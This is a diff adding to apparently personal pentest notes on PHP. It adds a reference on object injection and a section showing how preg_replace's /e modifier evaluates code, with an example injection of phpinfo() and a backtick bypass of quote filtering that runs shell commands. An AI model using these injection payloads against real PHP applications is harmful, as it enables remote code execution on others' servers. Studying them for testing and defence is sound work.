@@ -1,6 +1,7 @@
 # PHP
 
 ## References
+- [Understanding PHP Object Injection](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)
 - https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/
 - https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
 - http://pentestmonkey.net/tools/web-shells/php-reverse-shell
@@ -53,3 +54,37 @@ exec()
 ```
 
 > https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/
+
+## PHP PCRE Functions
+- implement regular expressions for the preg_ functions (preg_match, preg_replace)
+- `/e` modifier which allows evaluation of PHP code in the preg_replace
+
+Example:
+```
+<?php
+$string = "this is my lower sting";
+print preg_replace('/(.*)/e', 'strtoupper("\\1")', '$string');
+?>
+
+// THIS IS MY LOWER STING
+```
+
+Example Attack:
+```
+<?php
+$string = "phpinfo()";
+print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);
+?>
+```
+
+Filter Evasion:
+- Prevent single quote and escape chars
+```
+Following will fail:
+  $string = "system('ls -lah')";
+
+Bypass:
+  $string = "`ls -lah`";
+```
+
+> - Ref: http://www.madirish.net/402
